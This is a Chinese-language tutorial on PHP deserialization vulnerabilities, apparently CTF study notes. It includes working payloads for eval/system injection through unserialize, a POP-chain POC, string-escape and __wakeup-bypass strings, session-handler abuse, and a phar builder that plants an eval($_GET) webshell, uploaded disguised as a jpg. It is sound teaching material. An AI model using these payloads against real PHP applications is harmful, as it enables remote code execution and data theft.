# PHP反序列化

## 概念

1. **反序列化之后的内容为一个对象**

2. **反序列化生成的对象里的值，由反序列化里的值提供；与原有类预定义的值无关**

   反序列化漏洞的成因：反序列化过程中，unserialize()接收的值（字符串）可控；

   通过更改这个值（字符串），得到所需要的代码，即生产的对象的属性值。

3. **反序列化不触发类的成员方法；需要调用方法后才能触发；**

   通过调用方法，触发代码执行

```php
<?php
class test{
    public $a = 'echo "this is test!!";';
    public function displayVar() {
        eval($this->a);
    }
}
$c = new test();
$c->displayVar();//输出结果为this is test
    
$get = $_GET["benben"];//可控字符串，benben为对象序列化后的字符串
$b = unserialize($get);//$b把字符串$get反序列化为对象，通过更改字符串可改变得到的对象中\$a的值
$b->displayVar();//通过调用方法触发可控代码

通过提交?benben=O:4:"test":1:{s:1:"a";s:13:"system("id");";}
即可执行命令id
```

## 魔术方法构造和析构

**什么是魔术方法**

魔术方法是一个预定义好的，在特定情况下自动触发的行为方法

**魔术方法的作用**

反序列化漏洞的成因：反序列化过程中，unserialize()接收的值（字符串）可控；

通过更改这个值（字符串），得到所需要的代码；

通过调用方法，触发代码执行。

**魔术方法在特定条件下自动调用相关方法，最终导致触发代码**

* __construct()，类的构建函数

  ```php
  //构造函数，在实例化一个对象的时候，首先会去自动执行的一个方法
  <?php
  highlight_file(__FILE__);
  class User {
      public $username;
      public function __construct($username) {
          $this->username = $username;
          echo "触发了构造函数1次" ;
      }
  }
  $test = new User("benben");//实例化对象时触发构造函数__construct()
  $ser = serialize($test);//序列化和反序列化时不会触发
  unserialize($ser);
  ```

  

* __destruct()，类的析构函数

  ```php
  //析构函数，在对象的所有引用被删除或者当对象被显式销毁时执行的魔术方法
  <?php
  highlight_file(__FILE__);
  class User {
      public function __destruct()
      {
          echo "触发了析构函数1次"."<br />" ;
      }
  }
  $test = new User("benben");//实例化对象结束后，代码运行完会销毁，触发析构函数__destruct()
  $ser = serialize($test);//序列化不会触发
  unserialize($ser);//反序列化会触发
  
  /*例题*/
  
  <?php
  class User {
      var $cmd = "echo 'dazhuang666!!';" ;
      public function __destruct()
      {
          eval ($this->cmd);
      }
  }
  $ser = $_GET["benben"];
  unserialize($ser);
  
  //unserialize()触发__destruct()
  //destruct()执行eval()
  //eval()触发代码
  
  构造?benben=O:4:"User":1:{s:3:"cmd";s:13:"echo 'system("ls")';";}
  ```
  
  

* __call()，在对象中调用一个不可以访问方法时调用

  ```php
  //触发时机：调用一个不存在的方法
  //参数：2个参数传参$arg1,$arg2
  //返回值：调用的不存在的方法的名称和参数
  <?php
  highlight_file(__FILE__);
  error_reporting(0);
  class User {
      public function __call($arg1,$arg2)
      {
          echo "$arg1,$arg2[0]";
      }
  }
  $test = new User() ;
  $test -> callxxx('a');
  //输出
  callxxx,a
  ```

  

* __callStatic()，用静态方式中调用一个不可以访问方法的调用

  ```php
  //触发时机：静态调用或调用成员常量时使用的方法不存在
  //参数：2个参数传参$arg1,$arg2
  //返回值：调用的不存在的方法的名称和参数
  <?php
  highlight_file(__FILE__);
  error_reporting(0);
  class User {
      public function __callStatic($arg1,$arg2)
      {
          echo "$arg1,$arg2[0]";
      }
  }
  $test = new User() ;
  $test::callxxx('a');//静态调用::时的方法callxxx()不存在，触发callstatic()
  //输出
  callxxx,a
  ```

  

* __get()，获得一个类的成员变量时的调用

  ```php
  //触发时机：调用的成员属性不存在
  //参数：传参$arg1
  //返回值：不存在的成员属性的名称
  <?php
  class User {
      public $var1;
      public function __get($arg1)
      {
          echo  $arg1;
      }
  }
  $test = new User() ;
  $test ->var2;
  //输出
  var2
  ```

* __isset()，当对不可访问属性调用isset()或empty()时调用

  ```php
  //触发时机：对不可访问属性使用isset()或empty()时，__isset()会被调用
  //参数：传参$arg1
  //返回值：不存在的成员属性的名称
  <?php
  class User {
      private $var;
      public function __isset($arg1 )
      {
          echo  $arg1;
      }
  }
  $test = new User() ;
  isset($test->var);
  //输出
  var
  ```

  

* __set()，设置一个类的成员变量时调用

  ```php
  //触发时机：给不存在的成员属性赋值
  //参数：传参$arg1,$arg2
  //返回值：不存在的成员属性的名称和赋的值
  <?php
  class User {
      public $var1;
      public function __set($arg1 ,$arg2)
      {
          echo  $arg1.','.$arg2;
      }
  }
  $test = new User() ;
  $test ->var2=1;//单独调用不会触发__set()，必须赋值才会触发
  //输出
  var2,1
  ```

  

* __unset()，当对不可访问属性调用unset()时被调用

  ```php
  <?php
  class User {
      private $var;
      public function __unset($arg1 )
      {
          echo  $arg1;
      }
  }
  $test = new User() ;
  unset($test->var);
  //输出
  var
  ```

  

* __sleep()，执行serialize()时，先会调用这个函数

  ```php
  //此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组
  //如果该方法未返回任何内容，则NULL被序列化，并产生一个E_NOTICE级别的错误
  //触发时机：序列化serialize()之前
  //功能：对象被序列化之前触发，返回需要被序列化存储的成员的属性，删除不必要的属性
  //参数：成员属性
  //返回值：需要被序列化存储的成员属性
  <?php
  highlight_file(__FILE__);
  class User {
      const SITE = 'uusama';
      public $username;
      public $nickname;
      private $password;
      public function __construct($username, $nickname, $password)    {
          $this->username = $username;
          $this->nickname = $nickname;
          $this->password = $password;
      }
      public function __sleep() {
          return array('username', 'nickname');//不返回password，__sleep执行返回需要序列化的变量名，过滤掉password变量
      }
  }
  $user = new User('a', 'b', 'c');
  echo serialize($user);//serialize()只序列化sleep返回的数组
  
  O:4:"User":2:{s:8:"username";s:1:"a";s:8:"nickname";s:1:"b";}
  ```

  

* __wakeup()，执行unserialize()时，先会调用这个函数

  ```php
  //__wakeup()在反序列化unserialize()之前
  //__destruct()在反序列化unserialize()之后
  <?php
  highlight_file(__FILE__);
  error_reporting(0);
  class User {
      const SITE = 'uusama';
      public $username;
      public $nickname;
      private $password;
      private $order;
      public function __wakeup() {
          $this->password = $this->username;
      }
  }
  $user_ser = 'O:4:"User":2:{s:8:"username";s:1:"a";s:8:"nickname";s:1:"b";}';
  var_dump(unserialize($user_ser));
  
  object(User)#1 (4) {
    ["username"]=>
    string(1) "a"
    ["nickname"]=>
    string(1) "b"
    ["password":"User":private]=>
    string(1) "a"
    ["order":"User":private]=>
    NULL
  }
  
  /*例题*/
  
  <?php
  class User {
      const SITE = 'uusama';
      public $username;
      public $nickname;
      private $password;
      private $order;
      public function __wakeup() {
          system($this->username);
      }
  }
  $user_ser = $_GET['benben'];
  unserialize($user_ser);
  
  ?benben=O:4:"User":4:{s:8:"username";s:2:"id";s:8:"nickname";N;s:14:" User password";N;s:11:" User order";N;}
  ```

  

* __toString()，类被当成字符串时的回应方法

  ```php
  //表达方式错误导致魔术方法触发
  //触发时机：把对象当成字符串调用
  //常用于构造POP链接
  <?php
  highlight_file(__FILE__);
  error_reporting(0);
  class User {
      var $benben = "this is test!!";
           public function __toString()
           {
               return '格式不对，输出不了!';
            }
  }
  $test = new User() ;
  print_r($test);
  echo "<br />";
  echo $test;
  //输出
  User Object ( [benben] => this is test!! )
  格式不对，输出不了!
  ```

  

* __invoke()，调用函数的方式调用一个对象时的回应方法

  ```php
  //把对象当作函数调用时触发
  <?php
  highlight_file(__FILE__);
  error_reporting(0);
  class User {
      var $benben = "this is test!!";
           public function __invoke()
           {
               echo  '它不是个函数!';
            }
  }
  $test = new User() ;
  echo $test ->benben;
  echo "<br />";
  echo $test() ->benben;
  //输出
  this is test!!
  它不是个函数!
  ```

  

* __set\_state()，调用var_export()导出类时，此静态方法被调用

* __clone()，当对象复制完成时调用

  ```php
  //当使用clone关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法__clone()
  <?php
  class User {
      private $var;
      public function __clone( )
      {
          echo  "__clone test";
            }
  }
  $test = new User() ;
  $newclass = clone($test)
  //输出
  __clone test
  ```

  

* __autoload()，尝试加载未定义的类

* __debugInfo()，打印所需调试信息

## POP链前置知识

```php
<?php
class index {
    private $test;
    public function __construct(){
        $this->test = new normal();
    }
    public function __destruct(){//反序列化触发魔术方法__destruct()
        $this->test->action();//从$test调用action()
    }
}
class normal {
    public function action(){
        echo "please attack me";
    }
}
class evil {
    var $test2;
    public function action(){
        eval($this->test2);//先找到可利用点eval，eval调用test2
    }
}
unserialize($_GET['test']);
//关联点：如何让$test调用evil里的成员方法action()
//解决思路：给$test赋值为对象test = new evil()

<?php
class index {
    private $test;
    public function __construct(){
        $this->test = new evil(); //给$test赋值实例化对象test = new evil()
    }                               //此时$a为实例化对象index()
//    public function __destruct(){ //其中成员属性$test = new evil()
//        $this->test->action();    //$test为实例化对象evil()
//    }                             //成员属性$test2 = "system('ls');";
}                                   //序列化只能序列化成员属性，不序列化成员方法
//class normal {
//    public function action(){
//        echo "please attack me";
//    }
//}
class evil {
    var $test2 = "system('ls')";
//    public function action(){
//        eval($this->test2);
//    }
}
$a = new index;
echo urlencode(serialize($a));
//unserialize($_GET['test']);
?test=O%3A5%3A%22index%22%3A1%3A%7Bs%3A11%3A%22%00index%00test%22%3BO%3A4%3A%22evil%22%3A1%3A%7Bs%3A5%3A%22test2%22%3Bs%3A13%3A%22system%28%27ls%27%29%3B%22%3B%7D%7D
```

## POP链

在反序列中，我们能控制的数据就是对象中的属性值（成员变量），所以在PHP反序列中有一种漏洞利用方法叫“面向属性编程”，即POP

POP链就是利用魔术方法在里面进行多次跳转然后获取敏感数据的一种payload。

```php
<?php
//flag is in flag.php
class Modifier {
    private $var;
    public function append($value)
    {
        include($value);
        echo $flag;
    }
    public function __invoke(){
        $this->append($this->var);
    }
}

class Show{
    public $source;
    public $str;
    public function __toString(){
        return $this->str->source;
    }
    public function __wakeup(){
        echo $this->source;
    }
}

class Test{
    public $p;
    public function __construct(){
        $this->p = array();
    }

    public function __get($key){
        $function = $this->p;
        return $function();
    }
}

if(isset($_GET['pop'])){
    unserialize($_GET['pop']);
}
```

目标：触发echo，调用$flag

1. 触发invoke，调用append，并使$var = flag.php
   invoke触发条件：把对象当作函数
2. 给$p赋值为对象，即function成为对象Modifier，却被当成函数调用，触发Modifier中的invoke
3. 触发__get（触发条件：调用不存在的成员属性）
4. 给$str赋值为对象Test，而Test中不存在成员属性source，则可触发Test里的成员方法get
5. 触发__toString（触发条件：把对象当作字符串）
6.  给$source赋值为对象Show，当字符串被echo调用，触发__toString
7. 触发__wakeup

```php
POC:
<?php
class Modifier {
    private $var = 'flag.php';
}
class Show{
    public $source;
    public $str;
}
class Test{
    public $p;
}

$a = new Modifier();
$b = new Test();
$b->p = $a;
$c = new Show();
$c->source = $c;
$c->str = $b;
echo urlencode(serialize($c));
```

## 字符串逃逸

### 字符减少

**反序列化分隔符**

反序列化以 ;} 结束，后面的字符串不影响正常的序列化

**属性逃逸**

一般在数据先经过一次serialize再经过unserialize，在这个中间反序列化的字符串变多或者变少的时候可能存在反序列化属性逃逸

```php
<?php
class A{
    public $v1 = 'a';
}
echo serialize(new A());
$b = 'O:1:"A":1:{s:2:"v1";s:1:"a";s:2:"v2";s:3:"ben";}';
var_dump(unserialize($b));
$c = 'O:1:"A":2:{s:2:"v1";s:1:"a";s:2:"v2";s:3:"ben";}';
var_dump(unserialize($c));

```

![image-20240331213427733](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20240331213427733.png)

```php
<?php
class A{
    public $v1 = "a\"b";
}
O:1:"A":1:{s:2:"v1";s:3:"a"b";}
"是字符还是格式符号，是由字符串长度3来判断的

在前面的字符串不出错的情况下，;}是反序列化结束符，后面的字符串不影响反序列化结果
$c = 'O:1:"A":2:{s:2:"v1";s:1:"a";s:2:"v2";s:3:"ben";}s:2:"v3":N;}';
var_dump(unserialize($c));//正常输出

object(A)#1 (2) {
  ["v1"]=>
  string(1) "a"
  ["v2"]=>
  string(3) "ben"
}
```

一般在数据先经过一次serialize再经过unserialize，在这个中间反序列化的字符串变多或者变少的时候才有可能存在反序列化属性逃逸

```php
<?php
class A{
    public $v1 = "abcsystem()";
    public $v2 = '123';
}
$data = serialize(new A());
O:1:"A":2:{s:2:"v1";s:11:"abcsystem()";s:2:"v2";s:3:"123";}
$data = str_replace("system()","",$data);
var_dump(unserialize($data));
str_replace把"system()"替换为空，字符串原本的格式被破坏，识别11位以后原本应该是"
```

![image-20240331220431661](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20240331220431661.png)

```php
<?php
class A{
    public $v1 = "abcsystem()system()system()";
    public $v2 = '1234567";s:2:"v3";s:3:"123";}';
}
$data = serialize(new A());
echo $data;
$data = str_replace("system()","",$data);
var_dump(unserialize($data));

/*输出*/

O:1:"A":2:{s:2:"v1";s:27:"abcsystem()system()system()";s:2:"v2";s:29:"1234567";s:2:"v3";s:3:"123";}";}

object(A)#1 (3) {
  ["v1"]=>
  string(27) "abc";s:2:"v2";s:29:"1234567"
  ["v2"]=>
  string(29) "1234567";s:2:"v3";s:3:"123";}"//注意这个
  ["v3"]=>
  string(3) "123"
}
```

**反序列化字符串逃逸：多逃逸出一个成员属性，第一个字符串减少，吃掉有效代码，在第二个字符串构造代码**

**例题**

```php
<?php
function filter($name){
    $safe=array("flag","php");
    $name=str_replace($safe,"hk",$name);
    return $name;
}
class test{
    var $user;
    var $pass;
    var $vip = false ;
    function __construct($user,$pass){
        $this->user=$user;
    $this->pass=$pass;
    }
}
$param=$_GET['user'];
$pass=$_GET['pass'];
$param=serialize(new test($param,$pass));
$profile=unserialize(filter($param));

if ($profile->vip){
    echo file_get_contents("flag.php");
}
payload:
$param='flagflagflagflagflagflagflagflagflagflag';
$pass= '1";s:4:"pass";s:6:"benben";s:3:"vip";b:1;}';
//首先：
O:4:"test":3:{s:4:"user";s:40:"flagflagflagflagflagflagflagflagflagflag";s:4:"pass";s:42:"1";s:4:"pass";s:6:"benben";s:3:"vip";b:1;}";s:3:"vip";b:0;}
//会转变为
O:4:"test":3:{s:4:"user";s:40:"hkhkhkhkhkhkhkhkhkhk";s:4:"pass";s:42:"1";s:4:"pass";s:6:"benben";s:3:"vip";b:1;}";s:3:"vip";b:0;}

hkhkhkhkhkhkhkhkhkhk";s:4:"pass";s:42:"1会被吃掉，vip被赋值为1，后面的语句失效
//然后：
object(test)#1 (3) {
  ["user"]=>
  string(40) "hkhkhkhkhkhkhkhkhkhk";s:4:"pass";s:42:"1"
  ["pass"]=>
  string(6) "benben"
  ["vip"]=>
  bool(true)
}
```



### 字符增多

```php
<?php
class A{
    public $v1 = 'ls';
    public $v2 = '123';
}
$data = serialize(new A());
echo $data;
//O:1:"A":2:{s:2:"v1";s:2:"ls";s:2:"v2";s:3:"123";}
$data = str_replace("ls","pwd",$data);
echo $data;
//O:1:"A":2:{s:2:"v1";s:2:"pwd";s:2:"v2";s:3:"123";}
//字符增多，会把末尾多出来的字符挤出
var_dump(unserialize($data));//b
//思路：把吐出来的字符构造成功能性代码
```

O:1:"A":2:{s:2:"v1";s:??:"pw**d";s:2:"v3";s:3:"666";}**“;s:2:”v2“;s:3:”“123”;}

吐出这些字符";s:2:"v3";s:3:"666";}，使结构完整

并且;}可以把反序列化结束掉，不再管后面的原功能性代码

增加的“;s:2:”v3“;s:3:”666“;}一共22位

一个ls转成pwd增加一位字符，所以需要22个ls转成pwd

```php
<?php
class A{
    public $v1 = 'ls';
    public $v2 = '123';

    public function __construct($arga,$argc){
        $this->v1 = $arga;
        $this->v2 = $argc;
    }
}
$a = $_GET['v1'];
$b = $_GET['v2'];
$data =  serialize(new A($a,$b));
$data = str_replace("ls","pwd",$data);
var_dump(unserialize($data));

输入?v1=lslslslslslslslslslslslslslslslslslslslslsls";s:2:"v3";s:3:"666";}后，输出

object(A)#1 (3) { ["v1"]=> string(66) "pwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwdpwd" ["v2"]=> string(3) "123" ["v3"]=> string(3) "666" }

```

**例题**

```php
<?php
function filter($name){
    $safe=array("flag","php");
    $name=str_replace($safe,"hack",$name);//php替换为hack后字符增多，字符串增多，把有效代码往外吐
    return $name;
}
class test{
    var $user;
    var $pass='daydream';
    function __construct($user){
        $this->user=$user;
    }
}
$param=$_GET['param'];
$param=serialize(new test($param));
$profile=unserialize(filter($param));

if ($profile->pass=='escaping'){
    echo file_get_contents("flag.php");
}
//关键性判断pass=='escaping'
$user的值可控
//O:4:"test":2:{s:4:"user";s:3:"php";s:4:"pass";s:8:"escaping";}
s:4:"user";s:??:"hack...";s:4:"pass";s:8:"escaping";}";
需要吐出29个字符
payload:
?param=phpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphpphp";s:4:"pass";s:8:"escaping";}

将";s:4:"pass";s:8:"daydream";	}扔掉
```

## __weakup绕过

如果存在\_\_weakup方法，调用unserialize()方法前则先调用\_\_weakup方法，但是序列化字符串中表示对象属性个数的值大于真实的属性个数时，会跳过__weakup的执行

O:4:"test":2:{s:2:"v1";s:6:"benben";s:2:"v2";s:3:"123";}
O:4:"test":**3**:{s:2:"v1";s:6:"benben";s:2:"v2";s:3:"123";}

成员属性为3，但实际后面只有两个属性

```php
<?php
class secret{
    var $file='index.php';
    public function __construct($file){
        $this->file=$file;
    }
    function __destruct(){
        include_once($this->file);
        echo $flag;
    }
    function __wakeup(){
        $this->file='index.php';
    }
}
$cmd=$_GET['cmd'];
if (!isset($cmd)){
    highlight_file(__FILE__);
}
else{
    if (preg_match('/[oc]:\d+:/i',$cmd)){
        echo "Are you daydreaming?";
    }
    else{
        unserialize($cmd);
    }
}

O:6:"secret":1:{s:4:"file";s:8:"flag.php";}
O:6:"secret":2:{s:4:"file";s:8:"flag.php";}
把成员属性数量值写成2，就可以跳过__weakup()
但是正则表达式限制了O:后面不能跟数字
O:+6:"secret":2:{s:4:"file";s:8:"flag.php";}
加号+跳过正则表达式判断
urlencode('O:+6:"secret":2:{s:4:"file";s:8:"flag.php";}')
```

## 引用

```php
<?php
include("flag.php");
class just4fun {
    var $enter;
    var $secret;
}
if (isset($_GET['pass'])) {
    $pass = $_GET['pass'];
    $pass=str_replace('*','\*',$pass);
}
$o = unserialize($pass);
if ($o) {
    $o->secret = "*";
    if ($o->secret === $o->enter)
        echo "Congratulation! Here is my secret: ".$flag;
    else
        echo "Oh no... You can't fool me";
}
else echo "are you trolling?";

/*题解*/
<?php
class just4fun {
    var $enter;
    var $secret;
}
$a = new just4fun();
$a->enter = &$a->secret;
echo serialize($a);
```

## SESSION反序列化

当session_start()被调用或者php.ini中session.auto_start为1时，PHP内部调用会话管理器，访问用户session被序列化后，存储到指定目录，默认为/tmp

存取数据的数据的格式有多种，常用的有三种

漏洞产生：写入格式和读取格式不一致

| 处理器        | 对应的存储格式                                               |
| ------------- | ------------------------------------------------------------ |
| php           | 键名 + 竖线 + 经过serialize()函数序列化处理的值              |
| php_serialize | 经过serialize()函数序列化处理的数组                          |
| php_binary    | 键名的长度对应的ASCII字符 + 键名 + 经过serialize()函数反序列化处理的值 |

```php
/*第一种*/
<?php
session_start();
$_SESSION['benben'] = $_GET['ben'];

url中提交?ben = 123456
benben | s:6:"123456";

/*第二种*/
<?php
# 声明为php_serialize
ini_set('session.serialize_handler','php_serialize');
session_start();
$_SESSION['benben'] = $_GET['ben'];
$_SESSION['b'] = $_GET['b'];

url中提交?ben=dazhuang&b=666
a:2:{s:6:"benben";s:8:"dazhuang";s:1:"b";s:3:"666";}

/*第三种*/
<?php
ini_set('session.serialize_handler','php_binary');
session_start();
$_SESSION['benben'] = $_GET['ben'];
$_SESSION['b'] = $_GET['b'];

url中提交?ben=dazhuang&b=666
06benbens:8:"dazhuang";01bs:3:"666";
# 需要使用010editor查看二进制
```

### PHP session反序列化漏洞

当网站序列化并存储Session，与反序列化并读取Session的方式不同，就肯导致session反序列化漏洞的产生。

```php
/*session页面save.php*/

<?php
ini_set('session.serialize_handler','php_serialize');
session_start();
$_SESSION['ben'] = $_GET['a'];

/*漏洞页面vul.php*/

<?php 
ini_set('session.serialize_handler','php');
session_start();
class D{
    var $a;
    function __destruct(){
        eval($this->a);
    }
}

在save.php页面提交?a=|O:1:"D":1:{s:1:"a";s:10:"phpinfo();";}

save.php中使用php_serialize格式保存:
a:1:{s:3:"ben";s:39:"|O:1:"D":1:
{s:1:"a";s:10:"phpinfo();";}";}

而在vul.php中是以php的格式保存的：
a:1:{s:3:"ben";s:39:"|O:1:"D":1:{s:1:"a";s:10:"phpinfo();";}";}

其中a:1:{s:3"ben";s:39:"}为键名 + | + O:1:"D":1:{s:1:"a";s:10:"phpinfo();";}";}

以php格式读取时会把O:1:"D":1:{s:1:"a";s:10:"phpinfo();";}";}
进行反序列化unserialize()，而后面多出来的";}会被注释
```

### 例题

```php
/*index.php*/
<?php
/*hint.php*/
session_start();
class Flag{
    public $name;
    public $her;
    function __wakeup(){
        $this->her=md5(rand(1, 10000));
        if ($this->name===$this->her){
            include('flag.php');
            echo $flag;
        }
    }
}

/*hint.php*/
<?php
ini_set('session.serialize_handler', 'php_serialize');
session_start();
$_SESSION['a'] = $_GET['a'];
```

```php
<?php
class Flag
{
    public $name;
    public $her;
}
$a = new Flag();
$a->name = &$a->her;
echo serialize($a);

O:4:"Flag":2:{s:4:"name";N;s:3:"her";R:2;}
```

默认页面如果是php格式处理session的话，读取时会对
O:4:"Flag":2:{s:4:"name";N;s:3:"her";R:2;}
进行反序列化，从而触发__wakeup

## phar反序列化原理

**什么是phar**

JAR是开发Java程序的一个应用，包括所有的可执行、可访问的文件，都打包进了一个JAR文件里，使得部署过程十分简单

PHAR(“Php ARchive”)是PHP里类似于JAR的一种打包文件。

对于PHP5.3或者更高版本，Phar后缀文件是默认开启支持的，可以直接使用它

文件包含：phar伪协议，可读取 .phar文件

**Phar结构**

1. stub phar文件标识，格式为xxx<?php xxx; __HALT\_\_COMPilER();?\>;（头部信息）

   ![image-20240404155717244](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20240404155717244.png)

2. manifest压缩文件的属性等信息，以序列化存储

   ![image-20240404155738665](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20240404155738665.png)

3. contents压缩文件的内容

   ![image-20240404155944937](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20240404155944937.png)

4. signature签名，放在文件末尾

   ![image-20240404155959438](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20240404155959438.png)

manifest压缩文件的属性等信息，以序列化存储；存在一段序列化的字符串；

调用phar伪协议，可读取 .phar文件；

**Phar协议解析文件时，会自动触发对manifest字段的序列化字符串进行反序列化**

Phar需要PHP >= 5.2 在php.ini中将phar.readonly设为Off（注意去掉前面的分号）

| 受影响的函数      |               |              |                   |
| ----------------- | ------------- | ------------ | ----------------- |
| fileatime         | filectime     | file_exists  | file_get_contents |
| file_put_contents | file          | filegroup    | fopen             |
| is_dir            | is_executable | is_file      | parse_ini_file    |
| is_readable       | is_writable   | is_writeable | parse_ini_file    |
| copy              | unlink        | stat         | readfile          |

```php
/*例题*/

/*index.php*/

<?php
class Testobj
{
    var $output="echo 'ok';";
    function __destruct()
    {
        eval($this->output);
    }
}
if(isset($_GET['filename']))
{
    $filename=$_GET['filename'];
    var_dump(file_exists($filename));//提交文件名filename，file_exists读取文件，检查文件是否存在
    // 提交?filename=/etc/passwd会返回bool(true)
    // 有文件包含功能，可调用phar伪协议，读取test.phar
}

/*phar.php*/(POC模板)

<?php
class Testobj
{
    var $output='';
}
@unlink('test.phar');   //删除之前的test.par文件(如果有)
$phar=new Phar('test.phar');  //创建一个phar对象，文件名必须以phar为后缀
$phar->startBuffering();  //开始写文件
$phar->setStub('<?php __HALT_COMPILER(); ?>');  //写入stub
$o=new Testobj();
$o->output='eval($_GET["a"]);';
$phar->setMetadata($o);//写入meta-data
$phar->addFromString("test.txt","test");  //添加要压缩的文件
$phar->stopBuffering();
```

访问phar.php页面后会在目录下创建test.phar文件，然后再在index.php的url上输入?filename=phar://test.phar&a=system(‘ls’);即可执行命令

Phar协议解析文件时，会自动触发对manifest字段的序列化，字符串进行反序列化

反序列化触发__destruct，执行eval($this->output)，而反序列化后output=‘eval(\$\_GET[“a”]);’

**Phar使用条件**

* phar文件能够上传到服务器端
* 要有可用反序列化魔术方法作为跳板
* 要有文件操作函数，如file_exists()，fopen()，file_get_contents()
* 文件操作函数参数可控，且 : 、/、phar等特殊字符没有被过滤

### 例题

```php
<?php
class TestObject {
    public function __destruct() {
        include('flag.php');
        echo $flag;
    }
}
$filename = $_POST['file'];
if (isset($filename)){
    echo md5_file($filename);
}
//upload.php，这是一个上传文件的页面
```

![image-20240404162726524](PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96.assets/image-20240404162726524.png)

```php
/*POC生成test.phar，注意php版本要低版本*/
<?php
class TestObject {
}
@unlink("test.phar");
$phar = new Phar("test.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$o = new Testobj();
$phar->setMetadata($o);
$phar->addFromString("text.txt","test");
$phar->stopBuffering();
```

然后修改后缀名为jpg再上传

最后post提交file=phar://upload/phar.jpg即可
